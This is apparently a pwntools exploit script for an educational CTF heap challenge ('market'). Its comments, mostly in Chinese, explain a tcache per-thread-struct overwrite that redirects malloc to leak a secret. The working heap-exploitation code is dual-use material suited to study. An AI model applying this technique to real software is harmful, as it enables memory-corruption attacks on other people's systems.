from pwn import *

#r = remote("60.250.197.227", 30209)
r = remote("edu-ctf.zoolab.org", 30209)
#r = process('../share/market')
context.arch = 'amd64'
context.terminal = ['tmux','splitw','-h']

r.sendlineafter('need','n') #第二個free會把 perthread_struct free掉(因為user先free調,此時在free 
secret的時候這個位置的值是key') 就會跑到 tcache裡面

r.sendlineafter('name','A') 
r.sendlineafter('long',str(0x280))  # malloc 這一塊會跟 perthread_struct的size依樣 所以會回傳perthread_struct
r.sendafter('secret',b'A'*0x80 + b'\xb0') # 寫入 perthread_struct  , 寫到 entries 那邊  更改接下來malloc的話會回傳的mem 位置

# 這邊有個重要的關念是;root secret  is malloc directly after malloc admin, 
# and root is currently in tcache, we look at tcache find admin mem, and we can deduct 
# secret mem is end with b0
# so we modify return address after malloc by modify perthread_struct entries
r.sendlineafter('new secret','4')
r.sendlineafter('long',str(0x10)) # get the secret mem
#gdb.attach(r)
r.sendafter('secret',b'A'*0x10) 
r.interactive()
